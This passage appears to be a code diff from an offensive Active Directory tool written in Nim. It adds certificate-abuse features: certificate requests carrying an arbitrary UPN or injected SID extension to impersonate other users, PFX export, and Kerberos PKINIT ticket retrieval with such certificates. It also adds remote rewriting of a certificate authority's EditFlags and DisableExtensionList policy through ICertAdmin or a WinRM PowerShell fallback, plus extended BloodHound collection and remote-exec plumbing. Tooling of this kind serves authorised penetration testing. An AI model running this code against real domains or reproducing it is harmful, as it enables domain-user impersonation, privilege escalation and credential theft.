+  defer: ASN1_OBJECT_free(obj)
+  let octet = ASN1_OCTET_STRING_new()
+  if octet == nil:
+    return nil
+  defer: ASN1_OCTET_STRING_free(octet)
+  if ASN1_OCTET_STRING_set(octet, unsafeAddr value[0], value.len.cint) != 1:
+    return nil
+  result = X509_EXTENSION_create_by_OBJ(nil, obj, 0, octet)
+
+proc generateAdcsCsr(config: CliConfig; includeRequestExtensions = true): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string] =
+  let prefix = adcsDefaultOutputPrefix(config)
   result.keyPath = prefix & ".key"
   result.csrPath = prefix & ".csr"
   let cn =
@@ -5672,18 +6438,49 @@ proc generateAdcsCsr(config: CliConfig): tuple[keyPath, csrPath, subject, csrDer
     cast[pointer](cnBytes), cn.len.cint, -1, 0)
   discard X509_REQ_set_pubkey(req, pkey)
   let sanValue =
-    if config.ldapAdcsUpn.len > 0:
+    if includeRequestExtensions and config.ldapAdcsUpn.len > 0:
       "otherName:1.3.6.1.4.1.311.20.2.3;UTF8:" & config.ldapAdcsUpn
-    elif config.ldapAdcsDns.len > 0:
+    elif includeRequestExtensions and config.ldapAdcsDns.len > 0:
       "DNS:" & config.ldapAdcsDns
     else: ""
+  var extStack: pointer = nil
+  var ownedExts: seq[ptr X509ExtObj] = @[]
   if sanValue.len > 0:
     let ext = X509V3_EXT_conf_nid(nil, nil, NID_subject_alt_name, sanValue.cstring)
     if ext != nil:
-      let stack = OPENSSL_sk_new_null()
-      discard OPENSSL_sk_push(stack, ext)
-      discard X509_REQ_add_extensions(req, stack)
-      OPENSSL_sk_free(stack)
+      if extStack == nil:
+        extStack = OPENSSL_sk_new_null()
+      if extStack != nil:
+        discard OPENSSL_sk_push(extStack, ext)
+        ownedExts.add ext
+      else:
+        X509_EXTENSION_free(ext)
+  if config.ldapAdcsSid.len > 0:
+    try:
+      let ext = makeNtdsSidSecurityExtension(config.ldapAdcsSid)
+      if ext == nil:
+        result.output = "failed to add SID security extension"
+        return
+      if extStack == nil:
+        extStack = OPENSSL_sk_new_null()
+      if extStack == nil:
+        X509_EXTENSION_free(ext)
+        result.output = "failed to allocate CSR extension stack"
+        return
+      discard OPENSSL_sk_push(extStack, ext)
+      ownedExts.add ext
+    except CatchableError as error:
+      result.output = "invalid SID security extension: " & error.msg
+      return
+  if extStack != nil:
+    if X509_REQ_add_extensions(req, extStack) != 1:
+      OPENSSL_sk_free(extStack)
+      for ext in ownedExts:
+        X509_EXTENSION_free(ext)
+      result.output = "failed to attach CSR extensions"
+      return
+    OPENSSL_sk_free(extStack)
+    for ext in ownedExts:
       X509_EXTENSION_free(ext)
   discard X509_REQ_sign(req, pkey, EVP_sha256())
   var derBuf: ptr byte = nil
@@ -5746,6 +6543,8 @@ proc ldapAdcsRequestJson(host: string; config: CliConfig): Future[JsonNode] {.as
   var certStatus = 0
   var certBody = ""
   var caPemPath = ""
+  var pfxPath = ""
+  var pfxOk = false
   if reqId.len > 0:
     let certResp = await adcsHttpNtlmRequest(host, port, max(config.timeoutMs, 8000),
       config.username, config.password, config.ntlmHash, config.domain,
@@ -5754,20 +6553,29 @@ proc ldapAdcsRequestJson(host: string; config: CliConfig): Future[JsonNode] {.as
     certStatus = certResp.status
     certBody = certResp.body
     if certResp.status == 200 and certResp.body.len > 0:
-      certPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".cer"
+      let artifactPrefix = adcsDefaultOutputPrefix(config)
+      certPath = artifactPrefix & ".cer"
       writeFile(certPath, certResp.body)
+      pfxPath =
+        if config.ldapAdcsOut.toLowerAscii().endsWith(".pfx") or
+            config.ldapAdcsOut.toLowerAscii().endsWith(".p12"):
+          config.ldapAdcsOut
+        else:
+          artifactPrefix & ".pfx"
+      pfxOk = writePkcs12FromPemFiles(certPath, csr.keyPath, pfxPath, "")
       let caDer = await fetchAdcsCaDer(host, if config.port > 0: config.port else: 389,
         max(config.timeoutMs, 5000), config.username, config.password,
         config.domain, config.ntlmHash, config.ldapAdcsCa, config.kerberos)
       if caDer.len > 0:
-        caPemPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".ca.pem"
+        caPemPath = artifactPrefix & ".ca.pem"
         writeFile(caPemPath, pemWrap("CERTIFICATE", caDer))
   return %*{"protocol": "ldap", "operation": "adcs-request", "host": host,
     "success": resp.status in [200, 201] and reqId.len > 0,
     "http_status": resp.status, "request_id": reqId, "ca": config.ldapAdcsCa,
     "template": config.ldapAdcsTemplate, "on_behalf_of": config.ldapAdcsOnBehalfOf,
     "key": csr.keyPath, "csr": csr.csrPath,
-    "cert": certPath, "ca_pem": caPemPath, "cert_http_status": certStatus,
+    "cert": certPath, "pfx": if pfxOk: pfxPath else: "", "ca_pem": caPemPath,
+    "cert_http_status": certStatus,
     "response_preview": resp.body[0 ..< min(resp.body.len, 500)],
     "cert_preview": certBody[0 ..< min(certBody.len, 200)],
     "message": if reqId.len > 0: "ADCS request submitted" else: resp.message}
@@ -5782,6 +6590,41 @@ proc pemWrap(label, raw: string): string =
     result.add '\n'
     inc i, chunkLen
   result.add "-----END " & label & "-----\n"
+
+proc writePkcs12FromPemFiles(certPath, keyPath, pfxPath, password: string): bool =
+  let certBio = BIO_new_file(certPath.cstring, "r")
+  if certBio == nil:
+    return false
+  defer: discard BIO_free(certBio)
+  let cert = PEM_read_bio_X509(certBio, nil, nil, nil)
+  if cert == nil:
+    return false
+  defer: X509_free(cert)
+  let keyBio = BIO_new_file(keyPath.cstring, "r")
+  if keyBio == nil:
+    return false
+  defer: discard BIO_free(keyBio)
+  let key = PEM_read_bio_PrivateKey(keyBio, nil, nil, nil)
+  if key == nil:
+    return false
+  defer: EVP_PKEY_free(key)
+  let pass =
+    if password.len > 0: password
+    else: ""
+  let p12 = PKCS12_create(pass.cstring, "nimux-adcs".cstring, key, cert, nil,
+    0, 0, 0, 0, 0)
+  if p12 == nil:
+    return false
+  defer: PKCS12_free(p12)
+  var derBuf: ptr byte = nil
+  let derLen = i2d_PKCS12(p12, addr derBuf)
+  if derLen <= 0 or derBuf == nil:
+    return false
+  defer: OPENSSL_free(derBuf)
+  var der = newString(derLen)
+  copyMem(addr der[0], derBuf, derLen)
+  writeFile(pfxPath, der)
+  result = true
 
 proc buildPkinitKrb5Config(realm, domain, kdcHost, caPemPath: string;
                            extraAnchors: seq[string] = @[]): string =
@@ -5808,7 +6651,7 @@ proc buildPkinitKrb5Config(realm, domain, kdcHost, caPemPath: string;
 
 proc adcsArtifactPrefix(config: CliConfig): string =
   if config.ldapAdcsOut.len > 0:
-    return config.ldapAdcsOut
+    return adcsOutputPrefix(config.ldapAdcsOut)
   for path in [config.ldapCertFile, config.ldapAdcsPfx]:
     if path.len == 0:
       continue
@@ -5817,6 +6660,63 @@ proc adcsArtifactPrefix(config: CliConfig): string =
         return path[0 ..< path.len - ext.len]
     return path
   ""
+
+proc firstSidInText(text: string): string =
+  let marker = "S-1-"
+  let start = text.find(marker)
+  if start < 0:
+    return ""
+  var stop = start
+  while stop < text.len and (text[stop].isDigit or text[stop] == '-' or text[stop] == 'S'):
+    inc stop
+  text[start ..< stop]
+
+proc firstBetween(text, prefix: string; stops: openArray[char]): string =
+  let start = text.find(prefix)
+  if start < 0:
+    return ""
+  var pos = start + prefix.len
+  var stop = pos
+  while stop < text.len and text[stop] notin stops:
+    inc stop
+  text[pos ..< stop].strip()
+
+proc adcsCertIdentityDiagnostics(config: CliConfig): JsonNode =
+  result = newJObject()
+  let prefix = adcsArtifactPrefix(config)
+  var certPath = config.ldapCertFile
+  if certPath.len == 0 and prefix.len > 0:
+    for ext in [".cer", ".crt", ".pem"]:
+      let candidate = prefix & ext
+      if fileExists(candidate):
+        certPath = candidate
+        break
+  if certPath.len == 0 or not fileExists(certPath):
+    return
+  var text = ""
+  try:
+    text = execProcess("openssl", args = @["x509", "-in", certPath, "-noout", "-text"],
+      options = {poUsePath, poStdErrToStdOut})
+  except CatchableError:
+    return
+  result["certificate"] = %certPath
+  let upn = firstBetween(text, "UPN:", [',', '\n', '\r'])
+  if upn.len > 0:
+    result["san_upn"] = %upn
+  let sidUrlPrefix = "URI:tag:microsoft.com,2022-09-14:sid:"
+  let sanSid = firstBetween(text, sidUrlPrefix, [',', '\n', '\r'])
+  if sanSid.len > 0:
+    result["san_url_sid"] = %sanSid
+  let secStart = text.find("Microsoft NTDS CA Extension")
+  if secStart >= 0:
+    let secEndMarker = "X509v3 Subject Key Identifier"
+    let secEndRel = text[secStart .. ^1].find(secEndMarker)
+    let secBlock =
+      if secEndRel >= 0: text[secStart ..< secStart + secEndRel]
+      else: text[secStart .. ^1]
+    let secSid = firstSidInText(secBlock)
+    if secSid.len > 0:
+      result["security_extension_sid"] = %secSid
 
 proc fetchAdcsCaDer(host: string; port: int; timeoutMs: int;
                     username, password, domain, ntlmHash, caName: string;
@@ -5882,6 +6782,213 @@ proc preparePkinitConfig(host, principal: string; config: CliConfig;
   writeFile(krb5Path, buildPkinitKrb5Config(realm, baseDomain, kdcHost, caPemPath, extraAnchors))
   result = (krb5Path, caPemPath)
 
+proc parseDwordOption(value: string): uint32 =
+  let clean = value.strip().toLowerAscii()
+  if clean.startsWith("0x"):
+    uint32(parseHexInt(clean[2 .. ^1]))
+  else:
+    uint32(parseInt(clean))
+
+proc splitRegistryList(value: string): seq[string] =
+  let clean = value.strip()
+  if clean.len == 0 or clean.toLowerAscii() in ["none", "clear", "-"]:
+    return @[]
+  for item in clean.split({',', ';', '\n', '\r', '\t', ' '}):
+    let token = item.strip()
+    if token.len > 0:
+      result.add token
+
+proc psSingleQuote(value: string): string =
+  "'" & value.replace("'", "''") & "'"
+
+proc certAdminConfigString(ca, domain: string): string =
+  let clean = ca.strip()
+  if clean.contains("\\"):
+    return clean
+  let parts = clean.split('-')
+  if parts.len >= 3 and parts[1].len > 0:
+    let domainClean = domain.strip().toLowerAscii()
+    if domainClean.len > 0 and domainClean.contains("."):
+      return parts[1] & "." & domainClean & "\\" & clean
+    return parts[1] & "\\" & clean
+  clean
+
+proc ldapAdcsPolicySetJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
+  if config.ldapAdcsCa.len == 0:
+    return %*{"protocol": "ldap", "operation": "adcs-policy", "host": host,
+      "success": false, "message": "--adcs-policy requires --ca <name>"}
+  if not config.ldapAdcsGetEditFlags and
+      not config.ldapAdcsGetDisableExtensionList and
+      config.ldapAdcsSetEditFlags.len == 0 and
+      not config.ldapAdcsSetDisableExtensionListPresent:
+    return %*{"protocol": "ldap", "operation": "adcs-policy", "host": host,
+      "success": false,
+      "message": "set --adcs-get-editflags, --adcs-get-disable-extension-list, --adcs-set-editflags, or --adcs-set-disable-extension-list"}
+  let credential = smbclient.SmbCredential(
+    username: config.username, password: config.password,
+    ntlmHash: config.ntlmHash, domain: config.domain,
+    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
+  let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
+  let nodePath = "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy"
+  let caConfig = certAdminConfigString(config.ldapAdcsCa, config.domain)
+  let caAuthority = certAdminAuthorityString(config.ldapAdcsCa)
+  var updates = newJArray()
+  var success = true
+  if config.ldapAdcsGetEditFlags:
+    let getResult = await certadminclient.getConfigEntryI4(
+      host, max(config.timeoutMs, 8000), credential, authMethod,
+      caAuthority, nodePath, "EditFlags")
+    if not getResult.success:
+      success = false
+    updates.add %*{"value": "EditFlags", "operation": "get", "type": getResult.valueKind,
+      "read": if getResult.success: "0x" & cast[uint32](getResult.valueI4).toHex(8) else: "",
+      "read_decimal": if getResult.success: $getResult.valueI4 else: "",
+      "transport": getResult.transport,
+      "hresult": "0x" & getResult.hresult.toHex(8),
+      "fault_status": "0x" & getResult.faultStatus.toHex(8),
+      "message": getResult.message}
+  if config.ldapAdcsGetDisableExtensionList:
+    let winrmPort =
+      if config.useSsl: 5986
+      else: 5985
+    let ps = "$ca2 = New-Object -ComObject CertificateAuthority.Admin; " &
+      "$config = " & psSingleQuote(caConfig) & "; " &
+      "$node = " & psSingleQuote(nodePath) & "; " &
+      "$v = $ca2.GetConfigEntry($config,$node,'DisableExtensionList'); " &
+      "if ($null -eq $v) { Write-Output 'NIMUX_DISABLE_EXTENSION_LIST=' } " &
+      "else { Write-Output ('NIMUX_DISABLE_EXTENSION_LIST=' + ($v -join ',')) }"
+    let oldStatus = getEnv("WINRMSHELL_STATUS")
+    putEnv("WINRMSHELL_STATUS", "0")
+    let getList = winrmclient.runWinRmCommand(
+      host, winrmPort,
+      config.username, config.password, config.ntlmHash, config.domain,
+      ps, config.useSsl,
+      if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
+      ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
+      spnOverride = "")
+    putEnv("WINRMSHELL_STATUS", oldStatus)
+    var rawValue = ""
+    for line in getList.output.splitLines():
+      let cleanLine = line.strip()
+      if cleanLine.startsWith("NIMUX_DISABLE_EXTENSION_LIST="):
+        rawValue = cleanLine["NIMUX_DISABLE_EXTENSION_LIST=".len .. ^1]
+    var entries: seq[string] = @[]
+    if getList.success and rawValue.len > 0:
+      for item in rawValue.split(','):
+        let clean = item.strip()
+        if clean.len > 0:
+          entries.add clean
+    if not getList.success:
+      success = false
+    updates.add %*{"value": "DisableExtensionList", "operation": "get",
+      "type": "VT_ARRAY|VT_BSTR",
+      "read": rawValue,
+      "entries": entries,
+      "transport": "winrm-com",
+      "hresult": if getList.success: "0x00000000" else: "",
+      "fault_status": "0x00000000",
+      "message": if getList.success: "CertificateAuthority.Admin GetConfigEntry succeeded"
+        else: getList.message}
+  if config.ldapAdcsSetEditFlags.len > 0:
+    var parsed = 0'u32
+    var parseOk = true
+    var setResult: certadminclient.CertAdminResult
+    try:
+      parsed = parseDwordOption(config.ldapAdcsSetEditFlags)
+      setResult = await certadminclient.setConfigEntry(
+        host, max(config.timeoutMs, 8000), credential, authMethod,
+        caAuthority, nodePath, "EditFlags",
+        certadminclient.CertAdminValue(
+          kind: certadminclient.cavI4,
+          i4: cast[int32](parsed)))
+    except CatchableError:
+      parseOk = false
+    if not parseOk or not setResult.success:
+      success = false
+    var verifyResult: certadminclient.CertAdminResult
+    var verified = false
+    if parseOk and setResult.success:
+      verifyResult = await certadminclient.getConfigEntryI4(
+        host, max(config.timeoutMs, 8000), credential, authMethod,
+        caAuthority, nodePath, "EditFlags")
+      verified = verifyResult.success and cast[uint32](verifyResult.valueI4) == parsed
+      if not verified:
+        success = false
+    updates.add %*{"value": "EditFlags", "type": "VT_I4",
+      "requested": config.ldapAdcsSetEditFlags,
+      "written": if parseOk: "0x" & parsed.toHex(8) else: "",
+      "verified": verified,
+      "readback": if parseOk and verifyResult.success: "0x" & cast[uint32](verifyResult.valueI4).toHex(8) else: "",
+      "transport": setResult.transport,
+      "hresult": if parseOk: "0x" & setResult.hresult.toHex(8) else: "parse_error",
+      "fault_status": if parseOk: "0x" & setResult.faultStatus.toHex(8) else: "",
+      "message": if parseOk and setResult.success and not verified:
+          "SetConfigEntry returned S_OK but readback did not match"
+        elif parseOk: setResult.message
+        else: "invalid DWORD value"}
+  if config.ldapAdcsSetDisableExtensionListPresent:
+    let values = splitRegistryList(config.ldapAdcsSetDisableExtensionList)
+    let disableExtensionAuthority =
+      if caConfig.len > 0: caConfig
+      else: caAuthority
+    var setResult = await certadminclient.setConfigEntry(
+      host, max(config.timeoutMs, 8000), credential, authMethod,
+      disableExtensionAuthority, nodePath, "DisableExtensionList",
+      certadminclient.CertAdminValue(
+        kind: certadminclient.cavBstrArray,
+        strings: values))
+    if not setResult.success and setResult.faultStatus == 0x800706F7'u32:
+      var quotedValues: seq[string] = @[]
+      for value in values:
+        quotedValues.add psSingleQuote(value)
+      let expected = values.join(",")
+      let winrmPort =
+        if config.useSsl: 5986
+        else: 5985
+      let ps = "$ca2 = New-Object -ComObject CertificateAuthority.Admin; " &
+        "$config = " & psSingleQuote(caConfig) & "; " &
+        "$node = " & psSingleQuote(nodePath) & "; " &
+        "$arr = [string[]]@(" & quotedValues.join(",") & "); " &
+        "$ca2.SetConfigEntry($config,$node,'DisableExtensionList',$arr); " &
+        "$v = $ca2.GetConfigEntry($config,$node,'DisableExtensionList'); " &
+        "$joined = ($v -join ','); " &
+        "if ($joined -ne " & psSingleQuote(expected) & ") { throw ('readback mismatch: ' + $joined) }; " &
+        "Write-Output ('verified=' + $joined)"
+      let oldStatus = getEnv("WINRMSHELL_STATUS")
+      putEnv("WINRMSHELL_STATUS", "0")
+      let fallback = winrmclient.runWinRmCommand(
+        host, winrmPort,
+        config.username, config.password, config.ntlmHash, config.domain,
+        ps, config.useSsl,
+        if config.kerberos: winrmclient.wamKerberos else: winrmclient.wamNtlm,
+        ccache = config.ccachePath, krb5Config = config.krb5ConfigPath,
+        spnOverride = "")
+      putEnv("WINRMSHELL_STATUS", oldStatus)
+      if fallback.success:
+        setResult.success = true
+        setResult.transport = "winrm-com-fallback"
+        setResult.hresult = 0'u32
+        setResult.faultStatus = 0'u32
+        setResult.message = "ICertAdminD2 BSTR array stub rejected; WinRM COM fallback verified DisableExtensionList"
+      else:
+        setResult.message = setResult.message & "; WinRM COM fallback failed: " & fallback.message
+    if not setResult.success:
+      success = false
+    updates.add %*{"value": "DisableExtensionList", "type": "VT_ARRAY|VT_BSTR",
+      "requested": config.ldapAdcsSetDisableExtensionList,
+      "entries": values,
+      "transport": setResult.transport,
+      "hresult": "0x" & setResult.hresult.toHex(8),
+      "fault_status": "0x" & setResult.faultStatus.toHex(8),
+      "message": setResult.message}
+  return %*{"protocol": "ldap", "operation": "adcs-policy", "host": host,
+    "success": success, "ca": config.ldapAdcsCa, "config": caConfig,
+    "authority": caAuthority,
+    "node_path": nodePath, "interface": "ICertAdminD2", "get_opnum": 44, "set_opnum": 45,
+    "updates": updates,
+    "message": if success: "ADCS policy values verified via ICertAdminD2"
+      else: "one or more ICertAdminD2 policy operations failed verification"}
+
 proc ldapAdcsAuthJson(host: string; config: CliConfig): JsonNode =
   var principal =
     if config.ldapAdcsUpn.len > 0: config.ldapAdcsUpn
@@ -5896,11 +7003,27 @@ proc ldapAdcsAuthJson(host: string; config: CliConfig): JsonNode =
   if principal.len == 0:
     return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
       "success": false, "message": "--adcs-auth requires --upn or -u/-d"}
+  let principalParts = principal.split("@", 1)
+  let principalUser = principalParts[0]
+  let principalRealm =
+    if principalParts.len > 1: principalParts[1]
+    elif config.domain.len > 0: config.domain.toUpperAscii()
+    else: ""
   var identity = ""
+  var nativeCertPath = ""
+  var nativeKeyPath = ""
   if config.ldapAdcsPfx.len > 0:
     identity = "PKCS12:" & config.ldapAdcsPfx
+    let prefix = adcsOutputPrefix(config.ldapAdcsPfx)
+    let sidecarCert = prefix & ".cer"
+    let sidecarKey = prefix & ".key"
+    if fileExists(sidecarCert) and fileExists(sidecarKey):
+      nativeCertPath = sidecarCert
+      nativeKeyPath = sidecarKey
   elif config.ldapCertFile.len > 0 and config.ldapAdcsKey.len > 0:
     identity = "FILE:" & config.ldapCertFile & "," & config.ldapAdcsKey
+    nativeCertPath = config.ldapCertFile
+    nativeKeyPath = config.ldapAdcsKey
   else:
     return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
       "success": false, "message": "--adcs-auth requires --pfx or --cert plus --key"}
@@ -5909,19 +7032,55 @@ proc ldapAdcsAuthJson(host: string; config: CliConfig): JsonNode =
     elif config.ccachePath.len > 0: config.ccachePath
     elif config.ldapAdcsOut.len > 0: config.ldapAdcsOut & ".ccache"
     else: getCurrentDir() / (principal.split("@")[0] & ".ccache")
-  let (krb5ConfigPath, caPemPath) =
+  var krb5ConfigPath = ""
+  var caPemPath = ""
+  if config.krb5ConfigPath.len > 0:
+    krb5ConfigPath = expandFilename(config.krb5ConfigPath)
+    if config.krb5CaPath.len > 0 and fileExists(config.krb5CaPath):
+      caPemPath = expandFilename(config.krb5CaPath)
+    else:
+      let sidecar = adcsArtifactPrefix(config) & ".ca.pem"
+      if sidecar.len > 7 and fileExists(sidecar):
+        caPemPath = sidecar
+  else:
     try:
-      waitFor preparePkinitConfig(host, principal, config)
+      let prepared = waitFor preparePkinitConfig(host, principal, config)
+      krb5ConfigPath = prepared[0]
+      caPemPath = prepared[1]
     except CatchableError as error:
       return %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
         "success": false, "principal": principal, "identity": identity,
         "ccache": ccache, "message": "PKINIT bootstrap failed: " & error.msg}
-  let r = pkinitmod.pkinitGetTgt(principal, identity, ccache, config.password,
-    krb5Config=krb5ConfigPath)
-  %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
+  let r =
+    if nativeCertPath.len > 0 and nativeKeyPath.len > 0 and principalRealm.len > 0:
+      pkinitmod.pkinitGetTgtNative(host, principalRealm, principalUser,
+        nativeCertPath, nativeKeyPath, ccache, max(config.timeoutMs, 15000))
+    else:
+      pkinitmod.pkinitGetTgt(principal, identity, ccache, config.password,
+        krb5Config=krb5ConfigPath)
+  var message = r.message
+  let certDiag =
+    if not r.success:
+      adcsCertIdentityDiagnostics(config)
+    else:
+      newJObject()
+  if certDiag.len > 0:
+    let secSid = certDiag{"security_extension_sid"}.getStr()
+    let sanSid = certDiag{"san_url_sid"}.getStr()
+    let sanUpn = certDiag{"san_upn"}.getStr()
+    if secSid.len > 0:
+      message.add "; certificate security extension SID is " & secSid
+      if sanSid.len > 0 and sanSid != secSid:
+        message.add " and overrides SAN URL SID " & sanSid
+      if sanUpn.len > 0:
+        message.add "; SAN UPN is " & sanUpn
+  var node = %*{"protocol": "ldap", "operation": "adcs-auth", "host": host,
     "success": r.success, "principal": r.principal, "identity": r.identity,
     "ccache": r.ccache, "krb5_config": krb5ConfigPath, "ca_pem": caPemPath,
-    "message": r.message}
+    "message": message}
+  if certDiag.len > 0:
+    node["certificate_identity"] = certDiag
+  node
 
 proc runKrb5Conf(config: CliConfig) =
   let targets = parseTargets(config.targets)
@@ -8103,6 +9262,8 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
     return await ldapGmsaJson(host, config)
   if config.ldapDnsAdd or config.ldapDnsDelete or config.ldapDnsReplace:
     return await ldapDnsRecordJson(host, config)
+  if config.ldapAdcsPolicySet:
+    return await ldapAdcsPolicySetJson(host, config)
   if config.ldapAdcsRequest:
     return await ldapAdcsRequestJson(host, config)
   if config.ldapAdcsAuth:
@@ -8620,6 +9781,8 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
     kerberoast: config.kerberoast,
     trusts: config.trusts or config.ldapBloodhound,
     gpos: config.gpos or config.ldapBloodhound,
+    ous: config.ldapBloodhound,
+    containers: config.ldapBloodhound,
     schema: config.ldapSchema,
     config: config.ldapConfig,
     fgpp: config.ldapFgpp,
@@ -8706,6 +9869,10 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
   for entry in probe.trusts: trustsArr.add ldapEntryJson(entry)
   var gposArr = newJArray()
   for entry in probe.gpos: gposArr.add ldapEntryJson(entry)
+  var ousArr = newJArray()
+  for entry in probe.ous: ousArr.add ldapEntryJson(entry)
+  var containersArr = newJArray()
+  for entry in probe.containers: containersArr.add ldapEntryJson(entry)
   var schemaArr = newJArray()
   for entry in probe.schema: schemaArr.add ldapEntryJson(entry)
   var configArr = newJArray()
@@ -8790,6 +9957,8 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
     "kerberoastable": kerbArr,
     "trusts": trustsArr,
     "gpos": gposArr,
+    "ous": ousArr,
+    "containers": containersArr,
     "schema": schemaArr,
     "config": configArr,
     "fgpp": fgppArr,
@@ -8840,17 +10009,21 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
       "computers": computersArr,
       "trusts": trustsArr,
       "gpos": gposArr,
+      "ous": ousArr,
+      "containers": containersArr,
       "domain_controllers": dcsArr,
       "domain_admins": adminsArr
     }
     if config.ldapBloodhoundOut.len > 0:
       let acesByDn = await collectBloodhoundAclMap(
-        host, config, probe.defaultNamingContext, probe.domainSid,
-        probe.users, probe.groups, probe.computers, probe.gpos)
+        host, config, probe.defaultNamingContext, config.domain, probe.domainSid,
+        probe.users, probe.groups, probe.computers, probe.gpos,
+        probe.ous, probe.containers)
       result["bloodhound_output"] = writeBloodhoundFiles(
         config.ldapBloodhoundOut, config.domain, probe.defaultNamingContext,
         probe.domainSid, probe.domainFunctionality,
         probe.users, probe.groups, probe.computers, probe.trusts, probe.gpos,
+        probe.ous, probe.containers,
         acesByDn, config.ldapBloodhoundLegacy)
       result["success"] = %(result["success"].getBool() and
         result["bloodhound_output"]{"valid"}.getBool() and
@@ -9399,7 +10572,8 @@ proc smbExecProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.
     config.username, config.password, config.ntlmHash,
     config.domain, config.remoteCommand,
     authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
-    ccache = config.ccachePath)
+    ccache = config.ccachePath,
+    krb5Config = config.krb5ConfigPath)
   result = %*{
     "protocol": "scm",
     "host": exec.host,
@@ -10042,7 +11216,8 @@ proc secretsProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.
               config.username, config.password, config.ntlmHash, config.domain,
               execCmd, waitMs = 4000,
               authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
-              ccache = config.ccachePath)
+              ccache = config.ccachePath,
+              krb5Config = config.krb5ConfigPath)
             if se.success: output = se.output.strip()
           of "wmi":
             let we = await wmiexecmod.wmiExec(host, config.port,
@@ -10612,7 +11787,7 @@ proc renderProtocolLine(node: JsonNode): string =
     result = topBorder(titleText)
     if node.hasKey("items") or node.hasKey("operation"):
       let ok = node{"success"}.getBool()
-      let isHttpOp = node{"operation"}.getStr() in ["adcs-request", "adcs-auth", "opsec-notes"]
+      let isHttpOp = node{"operation"}.getStr() in ["adcs-request", "adcs-auth", "adcs-policy", "opsec-notes"]
       if not isHttpOp:
         result.add "\n" & kv("auth",
           if node{"authenticated"}.getBool(): green("ok") else: red("fail"))
@@ -10621,7 +11796,7 @@ proc renderProtocolLine(node: JsonNode): string =
       if node{"operation"}.getStr() == "bloodhound":
         let bh = node{"bloodhound"}
         result.add "\n" & kv("format",
-          if node{"legacy"}.getBool(): brightYellow("legacy 4.x") else: brightCyan("ce"))
+          if node{"legacy"}.getBool(): brightYellow("bloodhound.py legacy v5") else: brightCyan("ce"))
         if node{"default_naming_context"}.getStr().len > 0:
           result.add "\n" & kv("base dn", brightCyan(node{"default_naming_context"}.getStr()))
         if node{"domain_sid"}.getStr().len > 0:
@@ -10737,6 +11912,55 @@ proc renderProtocolLine(node: JsonNode): string =
           result.add "\n" & kv("message", node{"message"}.getStr())
         result.add "\n" & bottomBorder()
         return
+      if node{"operation"}.getStr() == "adcs-policy":
+        let ok = node{"success"}.getBool()
+        if node{"ca"}.getStr().len > 0:
+          result.add "\n" & kv("ca", bold(node{"ca"}.getStr()))
+        if node{"config"}.getStr().len > 0:
+          result.add "\n" & kv("config", brightCyan(node{"config"}.getStr()))
+        if node{"node_path"}.getStr().len > 0:
+          result.add "\n" & kv("node", dim(node{"node_path"}.getStr()))
+        let updates = node{"updates"}
+        if updates != nil and updates.kind == JArray:
+          for update in updates:
+            let valueName = update{"value"}.getStr()
+            let op = update{"operation"}.getStr()
+            let typeName = update{"type"}.getStr()
+            result.add "\n" & midBorder(brightCyan(valueName))
+            if op.len > 0:
+              result.add "\n" & kv("action", op)
+            if typeName.len > 0:
+              result.add "\n" & kv("type", typeName)
+            if update{"read"}.getStr().len > 0:
+              result.add "\n" & kv("read", brightGreen(update{"read"}.getStr()))
+            if update{"read_decimal"}.getStr().len > 0:
+              result.add "\n" & kv("decimal", update{"read_decimal"}.getStr())
+            if update{"requested"}.getStr().len > 0:
+              result.add "\n" & kv("requested", update{"requested"}.getStr())
+            if update{"written"}.getStr().len > 0:
+              result.add "\n" & kv("written", brightGreen(update{"written"}.getStr()))
+            if update{"readback"}.getStr().len > 0:
+              result.add "\n" & kv("readback", brightGreen(update{"readback"}.getStr()))
+            if update.hasKey("entries") and update["entries"].kind == JArray:
+              var entries: seq[string] = @[]
+              for item in update["entries"]:
+                entries.add item.getStr()
+              result.add "\n" & kv("entries",
+                if entries.len > 0: brightGreen(entries.join(", ")) else: dim("(empty)"))
+            if update.hasKey("verified"):
+              result.add "\n" & kv("verified",
+                if update{"verified"}.getBool(): green("yes") else: red("no"))
+            if update{"transport"}.getStr().len > 0:
+              result.add "\n" & kv("transport", update{"transport"}.getStr())
+            if update{"hresult"}.getStr().len > 0:
+              result.add "\n" & kv("hresult", update{"hresult"}.getStr())
+            if update{"message"}.getStr().len > 0:
+              result.add "\n" & kv("message", update{"message"}.getStr())
+        result.add "\n" & kv("status", if ok: green("ok") else: red("failed"))
+        if node{"message"}.getStr().len > 0:
+          result.add "\n" & kv("summary", node{"message"}.getStr())
+        result.add "\n" & bottomBorder()
+        return
       if node{"operation"}.getStr() in ["adcs-request", "adcs-auth"]:
         let ok = node{"success"}.getBool()
         if node{"ca"}.getStr().len > 0:
@@ -10748,8 +11972,10 @@ proc renderProtocolLine(node: JsonNode): string =
           result.add "\n" & kv("request_id", node{"request_id"}.getStr())
         if node{"cert"}.getStr().len > 0:
           result.add "\n" & kv("cert", brightGreen(node{"cert"}.getStr()))
-        elif node{"pfx"}.getStr().len > 0:
+        if node{"pfx"}.getStr().len > 0:
           result.add "\n" & kv("pfx", brightGreen(node{"pfx"}.getStr()))
+        if node{"key"}.getStr().len > 0 and not ok:
